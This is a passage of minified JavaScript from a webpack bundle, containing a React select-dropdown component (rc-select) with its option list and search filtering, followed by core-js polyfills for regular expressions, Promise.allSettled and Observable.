y?R.width=y:y&&(R.width=u),m["createElement"](X["a"],Object(a["a"])({},L,{showAction:C?["click"]:[],hideAction:C?["click"]:[],popupPlacement:v||("rtl"===b?"bottomRight":"bottomLeft"),builtinPlacements:O,prefixCls:T,popupTransitionName:I,popup:m["createElement"]("div",{ref:P,onMouseEnter:A},N),popupAlign:w,popupVisible:r,getPopupContainer:x,popupClassName:h()(f,Object(l["a"])({},"".concat(T,"-empty"),j)),popupStyle:R,getTriggerDOMNode:S,onPopupVisibleChange:C}),i)},Y=m["forwardRef"](J);Y.displayName="SelectTrigger";var Z=Y,ee=n("ikCq");function te(e,t){var n,a=e.key;return"value"in e&&(n=e.value),null!==a&&void 0!==a?a:void 0!==n?n:"rc-index-key-".concat(t)}function ne(e,t){var n=e||{},a=n.label,r=n.value,l=n.options;return{label:a||(t?"children":"label"),value:r||"value",options:l||"options"}}function ae(e){var t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:{},n=t.fieldNames,a=t.childrenAsData,r=[],l=ne(n,!1),o=l.label,i=l.value,c=l.options;function s(e,t){e.forEach((function(e){var n=e[o];if(t||!(c in e)){var l=e[i];r.push({key:te(e,r.length),groupOption:t,data:e,label:n,value:l})}else{var u=n;void 0===u&&a&&(u=e.label),r.push({key:te(e,r.length),group:!0,data:e,label:u}),s(e[c],!0)}}))}return s(e,!1),r}function re(e){var t=Object(o["a"])({},e);return"props"in t||Object.defineProperty(t,"props",{get:function(){return Object(d["a"])(!1,"Return type is option instead of Option instance. Please read value directly instead of reading from `props`."),t}}),t}function le(e,t){if(!t||!t.length)return null;var n=!1;function a(e,t){var l=Object(ee["a"])(t),o=l[0],i=l.slice(1);if(!o)return[e];var c=e.split(o);return n=n||c.length>1,c.reduce((function(e,t){return[].concat(Object(r["a"])(e),Object(r["a"])(a(t,i)))}),[]).filter((function(e){return e}))}var l=a(e,t);return n?l:null}var oe=["id","prefixCls","className","showSearch","tagRender","direction","omitDomProps","displayValues","onDisplayValuesChange","emptyOptions","notFoundContent","onClear","mode","disabled","loading","getInputElement","getRawInputElement","open","defaultOpen","onDropdownVisibleChange","activeValue","onActiveValueChange","activeDescendantId","searchValue","autoClearSearchValue","onSearch","onSearchSplit","tokenSeparators","allowClear","showArrow","inputIcon","clearIcon","OptionList","animation","transitionName","dropdownStyle","dropdownClassName","dropdownMatchSelectWidth","dropdownRender","dropdownAlign","placement","getPopupContainer","showAction","onFocus","onBlur","onKeyUp","onKeyDown","onMouseDown"],ie=["value","onChange","removeIcon","placeholder","autoFocus","maxTagCount","maxTagTextLength","maxTagPlaceholder","choiceTransitionName","onInputKeyDown","onPopupScroll","tabIndex"];function ce(e){return"tags"===e||"multiple"===e}var se=m["forwardRef"]((function(e,t){var n,d,p=e.id,y=e.prefixCls,j=e.className,S=e.showSearch,C=e.tagRender,L=e.direction,T=e.omitDomProps,N=e.displayValues,O=e.onDisplayValuesChange,I=e.emptyOptions,P=e.notFoundContent,R=void 0===P?"Not Found":P,_=e.onClear,q=e.mode,M=e.disabled,F=e.loading,D=e.getInputElement,U=e.getRawInputElement,z=e.open,H=e.defaultOpen,B=e.onDropdownVisibleChange,W=e.activeValue,V=e.onActiveValueChange,$=e.activeDescendantId,X=e.searchValue,Q=e.autoClearSearchValue,K=e.onSearch,J=e.onSearchSplit,Y=e.tokenSeparators,ee=e.allowClear,te=e.showArrow,ne=e.inputIcon,ae=e.clearIcon,re=e.OptionList,se=e.animation,ue=e.transitionName,de=e.dropdownStyle,me=e.dropdownClassName,pe=e.dropdownMatchSelectWidth,he=e.dropdownRender,ge=e.dropdownAlign,fe=e.placement,Ee=e.getPopupContainer,be=e.showAction,ve=void 0===be?[]:be,ye=e.onFocus,ke=e.onBlur,we=e.onKeyUp,xe=e.onKeyDown,je=e.onMouseDown,Se=Object(c["a"])(e,oe),Ce=ce(q),Ae=(void 0!==S?S:Ce)||"combobox"===q,Le=Object(o["a"])({},Se);ie.forEach((function(e){delete Le[e]})),null===T||void 0===T||T.forEach((function(e){delete Le[e]}));var Te=m["useState"](!1),Ne=Object(i["a"])(Te,2),Oe=Ne[0],Ie=Ne[1];m["useEffect"]((function(){Ie(Object(f["a"])())}),[]);var Pe=m["useRef"](null),Re=m["useRef"](null),_e=m["useRef"](null),qe=m["useRef"](null),Me=m["useRef"](null),Fe=k(),De=Object(i["a"])(Fe,3),Ue=De[0],ze=De[1],He=De[2];m["useImperativeHandle"](t,(function(){var e,t;return{focus:null===(e=qe.current)||void 0===e?void 0:e.focus,blur:null===(t=qe.current)||void 0===t?void 0:t.blur,scrollTo:function(e){var t;return null===(t=Me.current)||void 0===t?void 0:t.scrollTo(e)}}}));var Be=m["useMemo"]((function(){var e;if("combobox"!==q)return X;var t=null===(e=N[0])||void 0===e?void 0:e.value;return"string"===typeof t||"number"===typeof t?String(t):""}),[X,q,N]),We="combobox"===q&&"function"===typeof D&&D()||null,Ve="function"===typeof U&&U(),$e=Object(b["d"])(Re,null===Ve||void 0===Ve||null===(n=Ve.props)||void 0===n?void 0:n.ref),Ge=Object(u["a"])(void 0,{defaultValue:H,value:z}),Xe=Object(i["a"])(Ge,2),Qe=Xe[0],Ke=Xe[1],Je=Qe,Ye=!R&&I;(M||Ye&&Je&&"combobox"===q)&&(Je=!1);var Ze=!Ye&&Je,et=m["useCallback"]((function(e){var t=void 0!==e?e:!Je;M||(Ke(t),Je!==t&&(null===B||void 0===B||B(t)))}),[M,Je,Ke,B]),tt=m["useMemo"]((function(){return(Y||[]).some((function(e){return["\n","\r\n"].includes(e)}))}),[Y]),nt=function(e,t,n){var a=!0,r=e;null===V||void 0===V||V(null);var l=n?null:le(e,Y);return"combobox"!==q&&l&&(r="",null===J||void 0===J||J(l),et(!1),a=!1),K&&Be!==r&&K(r,{source:t?"typing":"effect"}),a},at=function(e){e&&e.trim()&&K(e,{source:"submit"})};m["useEffect"]((function(){Je||Ce||"combobox"===q||nt("",!1,!1)}),[Je]),m["useEffect"]((function(){Qe&&M&&Ke(!1),M&&ze(!1)}),[M]);var rt=w(),lt=Object(i["a"])(rt,2),ot=lt[0],it=lt[1],ct=function(e){var t,n=ot(),a=e.which;if(a===E["a"].ENTER&&("combobox"!==q&&e.preventDefault(),Je||et(!0)),it(!!Be),a===E["a"].BACKSPACE&&!n&&Ce&&!Be&&N.length){for(var l=Object(r["a"])(N),o=null,i=l.length-1;i>=0;i-=1){var c=l[i];if(!c.disabled){l.splice(i,1),o=c;break}}o&&O(l,{type:"remove",values:[o]})}for(var s=arguments.length,u=new Array(s>1?s-1:0),d=1;d<s;d++)u[d-1]=arguments[d];Je&&Me.current&&(t=Me.current).onKeyDown.apply(t,[e].concat(u));null===xe||void 0===xe||xe.apply(void 0,[e].concat(u))},st=function(e){for(var t=arguments.length,n=new Array(t>1?t-1:0),a=1;a<t;a++)n[a-1]=arguments[a];var r;Je&&Me.current&&(r=Me.current).onKeyUp.apply(r,[e].concat(n));null===we||void 0===we||we.apply(void 0,[e].concat(n))},ut=function(e){var t=N.filter((function(t){return t!==e}));O(t,{type:"remove",values:[e]})},dt=m["useRef"](!1),mt=function(){ze(!0),M||(ye&&!dt.current&&ye.apply(void 0,arguments),ve.includes("focus")&&et(!0)),dt.current=!0},pt=function(){ze(!1,(function(){dt.current=!1,et(!1)})),M||(Be&&("tags"===q?K(Be,{source:"submit"}):"multiple"===q&&K("",{source:"blur"})),ke&&ke.apply(void 0,arguments))},ht=[];m["useEffect"]((function(){return function(){ht.forEach((function(e){return clearTimeout(e)})),ht.splice(0,ht.length)}}),[]);var gt,ft=function(e){var t,n=e.target,a=null===(t=_e.current)||void 0===t?void 0:t.getPopupElement();if(a&&a.contains(n)){var r=setTimeout((function(){var e,t=ht.indexOf(r);(-1!==t&&ht.splice(t,1),He(),Oe||a.contains(document.activeElement))||(null===(e=qe.current)||void 0===e||e.focus())}));ht.push(r)}for(var l=arguments.length,o=new Array(l>1?l-1:0),i=1;i<l;i++)o[i-1]=arguments[i];null===je||void 0===je||je.apply(void 0,[e].concat(o))},Et=m["useState"](null),bt=Object(i["a"])(Et,2),vt=bt[0],yt=bt[1],kt=m["useState"]({}),wt=Object(i["a"])(kt,2),xt=wt[1];function jt(){xt({})}Object(g["a"])((function(){if(Ze){var e,t=Math.ceil(null===(e=Pe.current)||void 0===e?void 0:e.offsetWidth);vt===t||Number.isNaN(t)||yt(t)}}),[Ze]),Ve&&(gt=function(e){et(e)}),x((function(){var e;return[Pe.current,null===(e=_e.current)||void 0===e?void 0:e.getPopupElement()]}),Ze,et,!!Ve);var St,Ct,At=m["useMemo"]((function(){return Object(o["a"])(Object(o["a"])({},e),{},{notFoundContent:R,open:Je,triggerOpen:Ze,id:p,showSearch:Ae,multiple:Ce,toggleOpen:et})}),[e,R,Ze,Je,p,Ae,Ce,et]),Lt=void 0!==te?te:F||!Ce&&"combobox"!==q;Lt&&(St=m["createElement"](A,{className:h()("".concat(y,"-arrow"),Object(l["a"])({},"".concat(y,"-arrow-loading"),F)),customizeIcon:ne,customizeIconProps:{loading:F,searchValue:Be,open:Je,focused:Ue,showSearch:Ae}}));var Tt=function(){var e;null===_||void 0===_||_(),null===(e=qe.current)||void 0===e||e.focus(),O([],{type:"clear",values:N}),nt("",!1,!1)};M||!ee||!N.length&&!Be||"combobox"===q&&""===Be||(Ct=m["createElement"](A,{className:"".concat(y,"-clear"),onMouseDown:Tt,customizeIcon:ae},"\xd7"));var Nt,Ot=m["createElement"](re,{ref:Me}),It=h()(y,j,(d={},Object(l["a"])(d,"".concat(y,"-focused"),Ue),Object(l["a"])(d,"".concat(y,"-multiple"),Ce),Object(l["a"])(d,"".concat(y,"-single"),!Ce),Object(l["a"])(d,"".concat(y,"-allow-clear"),ee),Object(l["a"])(d,"".concat(y,"-show-arrow"),Lt),Object(l["a"])(d,"".concat(y,"-disabled"),M),Object(l["a"])(d,"".concat(y,"-loading"),F),Object(l["a"])(d,"".concat(y,"-open"),Je),Object(l["a"])(d,"".concat(y,"-customize-input"),We),Object(l["a"])(d,"".concat(y,"-show-search"),Ae),d)),Pt=m["createElement"](Z,{ref:_e,disabled:M,prefixCls:y,visible:Ze,popupElement:Ot,containerWidth:vt,animation:se,transitionName:ue,dropdownStyle:de,dropdownClassName:me,direction:L,dropdownMatchSelectWidth:pe,dropdownRender:he,dropdownAlign:ge,placement:fe,getPopupContainer:Ee,empty:I,getTriggerDOMNode:function(){return Re.current},onPopupVisibleChange:gt,onPopupMouseEnter:jt},Ve?m["cloneElement"](Ve,{ref:$e}):m["createElement"](G,Object(a["a"])({},e,{domRef:Re,prefixCls:y,inputElement:We,ref:qe,id:p,showSearch:Ae,autoClearSearchValue:Q,mode:q,activeDescendantId:$,tagRender:C,values:N,open:Je,onToggleOpen:et,activeValue:W,searchValue:Be,onSearch:nt,onSearchSubmit:at,onRemove:ut,tokenWithEnter:tt})));return Nt=Ve?Pt:m["createElement"]("div",Object(a["a"])({className:It},Le,{ref:Pe,onMouseDown:ft,onKeyDown:ct,onKeyUp:st,onFocus:mt,onBlur:pt}),Ue&&!Je&&m["createElement"]("span",{style:{width:0,height:0,position:"absolute",overflow:"hidden",opacity:0},"aria-live":"polite"},"".concat(N.map((function(e){var t=e.label,n=e.value;return["number","string"].includes(Object(s["a"])(t))?t:n})).join(", "))),Pt,St,Ct),m["createElement"](v.Provider,{value:At},Nt)}));var ue=se,de=function(e,t){var n=m["useRef"]({values:new Map,options:new Map}),a=m["useMemo"]((function(){var a=n.current,r=a.values,l=a.options,i=e.map((function(e){var t;return void 0===e.label?Object(o["a"])(Object(o["a"])({},e),{},{label:null===(t=r.get(e.value))||void 0===t?void 0:t.label}):e})),c=new Map,s=new Map;return i.forEach((function(e){c.set(e.value,e),s.set(e.value,t.get(e.value)||l.get(e.value))})),n.current.values=c,n.current.options=s,i}),[e,t]),r=m["useCallback"]((function(e){return t.get(e)||n.current.options.get(e)}),[t]);return[a,r]};function me(e,t){return O(e).join("").toUpperCase().includes(t)}var pe=function(e,t,n,a,r){return m["useMemo"]((function(){if(!n||!1===a)return e;var i=t.options,c=t.label,s=t.value,u=[],d="function"===typeof a,m=n.toUpperCase(),p=d?a:function(e,t){return r?me(t[r],m):t[i]?me(t["children"!==c?c:"label"],m):me(t[s],m)},h=d?function(e){return re(e)}:function(e){return e};return e.forEach((function(e){if(e[i]){var t=p(n,h(e));if(t)u.push(e);else{var a=e[i].filter((function(e){return p(n,h(e))}));a.length&&u.push(Object(o["a"])(Object(o["a"])({},e),{},Object(l["a"])({},i,a)))}}else p(n,h(e))&&u.push(e)})),u}),[e,a,r,n,t])},he=n("FnX0"),ge=n("ciTX"),fe=["children","value"],Ee=["children"];function be(e){var t=e,n=t.key,a=t.props,r=a.children,l=a.value,i=Object(c["a"])(a,fe);return Object(o["a"])({key:n,value:void 0!==l?l:n,children:r},i)}function ve(e){var t=arguments.length>1&&void 0!==arguments[1]&&arguments[1];return Object(ge["a"])(e).map((function(e,n){if(!m["isValidElement"](e)||!e.type)return null;var a=e,r=a.type.isSelectOptGroup,l=a.key,i=a.props,s=i.children,u=Object(c["a"])(i,Ee);return t||!r?be(e):Object(o["a"])(Object(o["a"])({key:"__RC_SELECT_GRP__".concat(null===l?n:l,"__"),label:l},u),{},{options:ve(s)})})).filter((function(e){return e}))}function ye(e,t,n,a,r){return m["useMemo"]((function(){var l=e,o=!e;o&&(l=ve(t));var i=new Map,c=new Map,s=function(e,t,n){n&&"string"===typeof n&&e.set(t[n],t)};function u(e){for(var t=arguments.length>1&&void 0!==arguments[1]&&arguments[1],l=0;l<e.length;l+=1){var o=e[l];!o[n.options]||t?(i.set(o[n.value],o),s(c,o,n.label),s(c,o,a),s(c,o,r)):u(o[n.options],!0)}}return u(l),{options:l,valueOptions:i,labelOptions:c}}),[e,t,n,a,r])}function ke(e){var t=m["useRef"]();t.current=e;var n=m["useCallback"]((function(){return t.current.apply(t,arguments)}),[]);return n}var we=function(){return null};we.isSelectOptGroup=!0;var xe=we,je=function(){return null};je.isSelectOption=!0;var Se=je,Ce=n("5svC"),Ae=n("E5p8"),Le=n("D97U");function Te(){return/(mac\sos|macintosh)/i.test(navigator.appVersion)}var Ne=m["createContext"](null),Oe=Ne,Ie=["disabled","title","children","style","className"];function Pe(e){return"string"===typeof e||"number"===typeof e}var Re=function(e,t){var n=y(),o=n.prefixCls,s=n.id,u=n.open,d=n.multiple,p=n.mode,g=n.searchValue,f=n.toggleOpen,b=n.notFoundContent,v=n.onPopupScroll,k=m["useContext"](Oe),w=k.flattenOptions,x=k.onActiveValue,S=k.defaultActiveFirstOption,C=k.onSelect,L=k.menuItemSelectedIcon,T=k.rawValues,N=k.fieldNames,O=k.virtual,I=k.listHeight,P=k.listItemHeight,R="".concat(o,"-item"),_=Object(Ae["a"])((function(){return w}),[u,w],(function(e,t){return t[0]&&e[1]!==t[1]})),q=m["useRef"](null),M=function(e){e.preventDefault()},F=function(e){q.current&&q.current.scrollTo("number"===typeof e?{index:e}:e)},D=function(e){for(var t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:1,n=_.length,a=0;a<n;a+=1){var r=(e+a*t+n)%n,l=_[r],o=l.group,i=l.data;if(!o&&!i.disabled)return r}return-1},U=m["useState"]((function(){return D(0)})),z=Object(i["a"])(U,2),H=z[0],B=z[1],W=function(e){var t=arguments.length>1&&void 0!==arguments[1]&&arguments[1];B(e);var n={source:t?"keyboard":"mouse"},a=_[e];a?x(a.value,e,n):x(null,-1,n)};Object(m["useEffect"])((function(){W(!1!==S?D(0):-1)}),[_.length,g]);var V=m["useCallback"]((function(e){return T.has(e)&&"combobox"!==p}),[p,Object(r["a"])(T).toString(),T.size]);Object(m["useEffect"])((function(){var e,t=setTimeout((function(){if(!d&&u&&1===T.size){var e=Array.from(T)[0],t=_.findIndex((function(t){var n=t.data;return n.value===e}));-1!==t&&(W(t),F(t))}}));u&&(null===(e=q.current)||void 0===e||e.scrollTo(void 0));return function(){return clearTimeout(t)}}),[u,g]);var $=function(e){void 0!==e&&C(e,{selected:!T.has(e)}),d||f(!1)};if(m["useImperativeHandle"](t,(function(){return{onKeyDown:function(e){var t=e.which,n=e.ctrlKey;switch(t){case E["a"].N:case E["a"].P:case E["a"].UP:case E["a"].DOWN:var a=0;if(t===E["a"].UP?a=-1:t===E["a"].DOWN?a=1:Te()&&n&&(t===E["a"].N?a=1:t===E["a"].P&&(a=-1)),0!==a){var r=D(H+a,a);F(r),W(r,!0)}break;case E["a"].ENTER:var l=_[H];l&&!l.data.disabled?$(l.value):$(void 0),u&&e.preventDefault();break;case E["a"].ESC:f(!1),u&&e.stopPropagation()}},onKeyUp:function(){},scrollTo:function(e){F(e)}}})),0===_.length)return m["createElement"]("div",{role:"listbox",id:"".concat(s,"_list"),className:"".concat(R,"-empty"),onMouseDown:M},b);var G=Object.keys(N).map((function(e){return N[e]})),X=function(e){return e.label},Q=function(e){var t=_[e];if(!t)return null;var n=t.data||{},r=n.value,l=t.group,o=Object(j["a"])(n,!0),i=X(t);return t?m["createElement"]("div",Object(a["a"])({"aria-label":"string"!==typeof i||l?null:i},o,{key:e,role:l?"presentation":"option",id:"".concat(s,"_list_").concat(e),"aria-selected":V(r)}),r):null};return m["createElement"](m["Fragment"],null,m["createElement"]("div",{role:"listbox",id:"".concat(s,"_list"),style:{height:0,width:0,overflow:"hidden"}},Q(H-1),Q(H),Q(H+1)),m["createElement"](Le["a"],{itemKey:"key",ref:q,data:_,height:I,itemHeight:P,fullHeight:!1,onMouseDown:M,onScroll:v,virtual:O},(function(e,t){var n,r=e.group,o=e.groupOption,i=e.data,s=e.label,u=e.value,d=i.key;if(r){var p,g=null!==(p=i.title)&&void 0!==p?p:Pe(s)?s.toString():void 0;return m["createElement"]("div",{className:h()(R,"".concat(R,"-group")),title:g},void 0!==s?s:d)}var f=i.disabled,E=i.title,b=(i.children,i.style),v=i.className,y=Object(c["a"])(i,Ie),k=Object(Ce["a"])(y,G),w=V(u),x="".concat(R,"-option"),S=h()(R,x,v,(n={},Object(l["a"])(n,"".concat(x,"-grouped"),o),Object(l["a"])(n,"".concat(x,"-active"),H===t&&!f),Object(l["a"])(n,"".concat(x,"-disabled"),f),Object(l["a"])(n,"".concat(x,"-selected"),w),n)),C=X(e),T=!L||"function"===typeof L||w,N="number"===typeof C?C:C||u,O=Pe(N)?N.toString():void 0;return void 0!==E&&(O=E),m["createElement"]("div",Object(a["a"])({},Object(j["a"])(k),{"aria-selected":w,className:S,title:O,onMouseMove:function(){H===t||f||W(t)},onClick:function(){f||$(u)},style:b}),m["createElement"]("div",{className:"".concat(x,"-content")},N),m["isValidElement"](L)||w,T&&m["createElement"](A,{className:"".concat(R,"-option-state"),customizeIcon:L,customizeIconProps:{isSelected:w}},w?"\u2713":null))})))},_e=m["forwardRef"](Re);_e.displayName="OptionList";var qe=_e;var Me=["id","mode","prefixCls","backfill","fieldNames","inputValue","searchValue","onSearch","autoClearSearchValue","onSelect","onDeselect","dropdownMatchSelectWidth","filterOption","filterSort","optionFilterProp","optionLabelProp","options","children","defaultActiveFirstOption","menuItemSelectedIcon","virtual","listHeight","listItemHeight","value","defaultValue","labelInValue","onChange"],Fe=["inputValue"];function De(e){return!e||"object"!==Object(s["a"])(e)}var Ue=m["forwardRef"]((function(e,t){var n=e.id,s=e.mode,d=e.prefixCls,p=void 0===d?"rc-select":d,h=e.backfill,g=e.fieldNames,f=e.inputValue,E=e.searchValue,b=e.onSearch,v=e.autoClearSearchValue,y=void 0===v||v,k=e.onSelect,w=e.onDeselect,x=e.dropdownMatchSelectWidth,j=void 0===x||x,S=e.filterOption,C=e.filterSort,A=e.optionFilterProp,L=e.optionLabelProp,T=e.options,N=e.children,I=e.defaultActiveFirstOption,P=e.menuItemSelectedIcon,_=e.virtual,q=e.listHeight,M=void 0===q?200:q,F=e.listItemHeight,D=void 0===F?20:F,U=e.value,z=e.defaultValue,H=e.labelInValue,B=e.onChange,W=Object(c["a"])(e,Me),V=Object(he["a"])(n),$=ce(s),G=!(T||!N),X=m["useMemo"]((function(){return(void 0!==S||"combobox"!==s)&&S}),[S,s]),Q=m["useMemo"]((function(){return ne(g,G)}),[JSON.stringify(g),G]),K=Object(u["a"])("",{value:void 0!==E?E:f,postState:function(e){return e||""}}),J=Object(i["a"])(K,2),Y=J[0],Z=J[1],ee=ye(T,N,Q,A,L),te=ee.valueOptions,le=ee.labelOptions,oe=ee.options,ie=m["useCallback"]((function(e){var t=O(e);return t.map((function(e){var t,n,a,r,l,o;De(e)?t=e:(a=e.key,n=e.label,t=null!==(o=e.value)&&void 0!==o?o:a);var i,c=te.get(t);c&&(void 0===n&&(n=null===c||void 0===c?void 0:c[L||Q.label]),void 0===a&&(a=null!==(i=null===c||void 0===c?void 0:c.key)&&void 0!==i?i:t),r=null===c||void 0===c?void 0:c.disabled,l=null===c||void 0===c?void 0:c.title);return{label:n,value:t,key:a,disabled:r,title:l}}))}),[Q,L,te]),se=Object(u["a"])(z,{value:U}),me=Object(i["a"])(se,2),ge=me[0],fe=me[1],Ee=m["useMemo"]((function(){var e,t=ie(ge);return"combobox"!==s||null!==(e=t[0])&&void 0!==e&&e.value?t:[]}),[ge,ie,s]),be=de(Ee,te),ve=Object(i["a"])(be,2),we=ve[0],xe=ve[1],je=m["useMemo"]((function(){if(!s&&1===we.length){var e=we[0];if(null===e.value&&(null===e.label||void 0===e.label))return[]}return we.map((function(e){var t;return Object(o["a"])(Object(o["a"])({},e),{},{label:null!==(t=e.label)&&void 0!==t?t:e.value})}))}),[s,we]),Se=m["useMemo"]((function(){return new Set(we.map((function(e){return e.value})))}),[we]);m["useEffect"]((function(){if("combobox"===s){var e,t=null===(e=we[0])||void 0===e?void 0:e.value;Z(R(t)?String(t):"")}}),[we]);var Ce=ke((function(e,t){var n,a=null!==t&&void 0!==t?t:e;return n={},Object(l["a"])(n,Q.value,e),Object(l["a"])(n,Q.label,a),n})),Ae=m["useMemo"]((function(){if("tags"!==s)return oe;var e=Object(r["a"])(oe),t=function(e){return te.has(e)};return Object(r["a"])(we).sort((function(e,t){return e.value<t.value?-1:1})).forEach((function(n){var a=n.value;t(a)||e.push(Ce(a,n.label))})),e}),[Ce,oe,te,we,s]),Le=pe(Ae,Q,Y,X,A),Te=m["useMemo"]((function(){return"tags"!==s||!Y||Le.some((function(e){return e[A||"value"]===Y}))?Le:[Ce(Y)].concat(Object(r["a"])(Le))}),[Ce,A,s,Le,Y]),Ne=m["useMemo"]((function(){return C?Object(r["a"])(Te).sort((function(e,t){return C(e,t)})):Te}),[Te,C]),Ie=m["useMemo"]((function(){return ae(Ne,{fieldNames:Q,childrenAsData:G})}),[Ne,Q,G]),Pe=function(e){var t=ie(e);if(fe(t),B&&(t.length!==we.length||t.some((function(e,t){var n;return(null===(n=we[t])||void 0===n?void 0:n.value)!==(null===e||void 0===e?void 0:e.value)})))){var n=H?t:t.map((function(e){return e.value})),a=t.map((function(e){return re(xe(e.value))}));B($?n:n[0],$?a:a[0])}},Re=m["useState"](null),_e=Object(i["a"])(Re,2),Ue=_e[0],ze=_e[1],He=m["useState"](0),Be=Object(i["a"])(He,2),We=Be[0],Ve=Be[1],$e=void 0!==I?I:"combobox"!==s,Ge=m["useCallback"]((function(e,t){var n=arguments.length>2&&void 0!==arguments[2]?arguments[2]:{},a=n.source,r=void 0===a?"keyboard":a;Ve(t),h&&"combobox"===s&&null!==e&&"keyboard"===r&&ze(String(e))}),[h,s]),Xe=function(e,t,n){var a=function(){var t,n=xe(e);return[H?{label:null===n||void 0===n?void 0:n[Q.label],value:e,key:null!==(t=null===n||void 0===n?void 0:n.key)&&void 0!==t?t:e}:e,re(n)]};if(t&&k){var r=a(),l=Object(i["a"])(r,2),o=l[0],c=l[1];k(o,c)}else if(!t&&w&&"clear"!==n){var s=a(),u=Object(i["a"])(s,2),d=u[0],m=u[1];w(d,m)}},Qe=ke((function(e,t){var n,a=!$||t.selected;n=a?$?[].concat(Object(r["a"])(we),[e]):[e]:we.filter((function(t){return t.value!==e})),Pe(n),Xe(e,a),"combobox"===s?ze(""):ce&&!y||(Z(""),ze(""))})),Ke=function(e,t){Pe(e);var n=t.type,a=t.values;"remove"!==n&&"clear"!==n||a.forEach((function(e){Xe(e.value,!1,n)}))},Je=function(e,t){if(Z(e),ze(null),"submit"!==t.source)"blur"!==t.source&&("combobox"===s&&Pe(e),null===b||void 0===b||b(e));else{var n=(e||"").trim();if(n){var a=Array.from(new Set([].concat(Object(r["a"])(Se),[n])));Pe(a),Xe(n,!0),Z("")}}},Ye=function(e){var t=e;"tags"!==s&&(t=e.map((function(e){var t=le.get(e);return null===t||void 0===t?void 0:t.value})).filter((function(e){return void 0!==e})));var n=Array.from(new Set([].concat(Object(r["a"])(Se),Object(r["a"])(t))));Pe(n),n.forEach((function(e){Xe(e,!0)}))},Ze=m["useMemo"]((function(){var e=!1!==_&&!1!==j;return Object(o["a"])(Object(o["a"])({},ee),{},{flattenOptions:Ie,onActiveValue:Ge,defaultActiveFirstOption:$e,onSelect:Qe,menuItemSelectedIcon:P,rawValues:Se,fieldNames:Q,virtual:e,listHeight:M,listItemHeight:D,childrenAsData:G})}),[ee,Ie,Ge,$e,Qe,P,Se,Q,_,j,M,D,G]);return m["createElement"](Oe.Provider,{value:Ze},m["createElement"](ue,Object(a["a"])({},W,{id:V,prefixCls:p,ref:t,omitDomProps:Fe,mode:s,displayValues:je,onDisplayValuesChange:Ke,searchValue:Y,onSearch:Je,autoClearSearchValue:y,onSearchSplit:Ye,dropdownMatchSelectWidth:j,OptionList:qe,emptyOptions:!Ie.length,activeValue:Ue,activeDescendantId:"".concat(V,"_list_").concat(We)})))}));var ze=Ue;ze.Option=Se,ze.OptGroup=xe;var He=ze;t["c"]=He},Kdrj:function(e,t,n){var a=n("SCbZ"),r=n("tS9j"),l=function(e){return function(t,n){var l,o,i=String(r(t)),c=a(n),s=i.length;return c<0||c>=s?e?"":void 0:(l=i.charCodeAt(c),l<55296||l>56319||c+1===s||(o=i.charCodeAt(c+1))<56320||o>57343?e?i.charAt(c):l:e?i.slice(c,c+2):o-56320+(l-55296<<10)+65536)}};e.exports={codeAt:l(!1),charAt:l(!0)}},KeQb:function(e,t,n){"use strict";var a=n("zKw/"),r=n("LMem"),l=RegExp.prototype.exec,o=String.prototype.replace,i=l,c=function(){var e=/a/,t=/b*/g;return l.call(e,"a"),l.call(t,"a"),0!==e.lastIndex||0!==t.lastIndex}(),s=r.UNSUPPORTED_Y||r.BROKEN_CARET,u=void 0!==/()??/.exec("")[1],d=c||u||s;d&&(i=function(e){var t,n,r,i,d=this,m=s&&d.sticky,p=a.call(d),h=d.source,g=0,f=e;return m&&(p=p.replace("y",""),-1===p.indexOf("g")&&(p+="g"),f=String(e).slice(d.lastIndex),d.lastIndex>0&&(!d.multiline||d.multiline&&"\n"!==e[d.lastIndex-1])&&(h="(?: "+h+")",f=" "+f,g++),n=new RegExp("^(?:"+h+")",p)),u&&(n=new RegExp("^"+h+"$(?!\\s)",p)),c&&(t=d.lastIndex),r=l.call(m?n:d,f),m?r?(r.input=r.input.slice(g),r[0]=r[0].slice(g),r.index=d.lastIndex,d.lastIndex+=r[0].length):d.lastIndex=0:c&&r&&(d.lastIndex=d.global?r.index+r[0].length:t),u&&r&&r.length>1&&o.call(r[0],n,(function(){for(i=1;i<arguments.length-2;i++)void 0===arguments[i]&&(r[i]=void 0)})),r}),e.exports=i},KtsK:function(e,t,n){var a=n("BHsG");function r(e,t){var n="undefined"!==typeof Symbol&&e[Symbol.iterator]||e["@@iterator"];if(!n){if(Array.isArray(e)||(n=a(e))||t&&e&&"number"===typeof e.length){n&&(e=n);var r=0,l=function(){};return{s:l,n:function(){return r>=e.length?{done:!0}:{done:!1,value:e[r++]}},e:function(e){throw e},f:l}}throw new TypeError("Invalid attempt to iterate non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")}var o,i=!0,c=!1;return{s:function(){n=n.call(e)},n:function(){var e=n.next();return i=e.done,e},e:function(e){c=!0,o=e},f:function(){try{i||null==n["return"]||n["return"]()}finally{if(c)throw o}}}}e.exports=r,e.exports.__esModule=!0,e.exports["default"]=e.exports},"L+Dc":function(e,t,n){"use strict";var a=n("0mt+"),r=n("XaNN"),l=n("PAgB"),o=n("jdHz"),i=n("NBU9");a({target:"Promise",stat:!0},{allSettled:function(e){var t=this,n=l.f(t),a=n.resolve,c=n.reject,s=o((function(){var n=r(t.resolve),l=[],o=0,c=1;i(e,(function(e){var r=o++,i=!1;l.push(void 0),c++,n.call(t,e).then((function(e){i||(i=!0,l[r]={status:"fulfilled",value:e},--c||a(l))}),(function(e){i||(i=!0,l[r]={status:"rejected",reason:e},--c||a(l))}))})),--c||a(l)}));return s.error&&c(s.value),n.promise}})},LMem:function(e,t,n){"use strict";var a=n("Xdqv");function r(e,t){return RegExp(e,t)}t.UNSUPPORTED_Y=a((function(){var e=r("a","y");return e.lastIndex=2,null!=e.exec("abcd")})),t.BROKEN_CARET=a((function(){var e=r("^r","gy");return e.lastIndex=2,null!=e.exec("str")}))},LT88:function(e,t,n){"use strict";var a=n("0mt+"),r=n("9Rcy"),l=n("tPcN"),o=n("XaNN"),i=n("oyD1"),c=n("a7jj"),s=n("k8mt"),u=n("u3TI").f,d=n("XExY"),m=n("P0Lz"),p=n("AAg8"),h=n("NBU9"),g=n("fhnH"),f=n("q7Pv"),E=n("lz/I"),b=f("observable"),v=E.get,y=E.set,k=function(e){return null==e?void 0:o(e)},w=function(e){var t=e.cleanup;if(t){e.cleanup=void 0;try{t()}catch(n){g(n)}}},x=function(e){return void 0===e.observer},j=function(e,t){if(!r){e.closed=!0;var n=t.subscriptionObserver;n&&(n.closed=!0)}t.observer=void 